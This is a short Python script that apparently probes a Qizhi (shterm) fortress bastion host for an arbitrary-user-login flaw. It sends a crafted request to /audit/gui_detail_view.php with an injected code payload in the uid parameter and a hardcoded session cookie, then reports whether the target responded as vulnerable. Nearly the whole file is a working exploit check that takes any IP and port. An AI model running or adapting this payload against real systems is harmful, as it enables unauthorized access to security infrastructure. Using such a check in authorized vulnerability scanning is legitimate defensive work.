#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    
    payload = "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"
    header = {"Cookie": "PHPSESSID=4uh4l0e3b0fd28d27l71u5be36"}                                                      #填写payload
    try:
        tar = "http://" + ip + ":" + port
        req = requests.get(tar + payload,headers=header,timeout=3,verify=False,allow_redirects=False)
        print(req.text)
        if req.status_code == 200:                                                          #修改匹配返回代码
            if ( u"错误的id" in req.text ):          #填写匹配信息
                logging.info(u"[+] {} find shtermQiZhi_Fortress_Arbitrary_User_Login".format(ip))                                 #填写漏洞信息
                os._exit(1)

            else :
                logging.info(u"[-] {} do not found shtermQiZhi_Fortress_Arbitrary_User_Login".format(ip))                         #填写漏洞信息
                os._exit(2)

        else :
            logging.info(u"[-] {} do not found shtermQiZhi_Fortress_Arbitrary_User_Login".format(ip))                             #填写漏洞信息
            os._exit(2)
    except Exception as e:
        logging.info("[*] timeout")
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
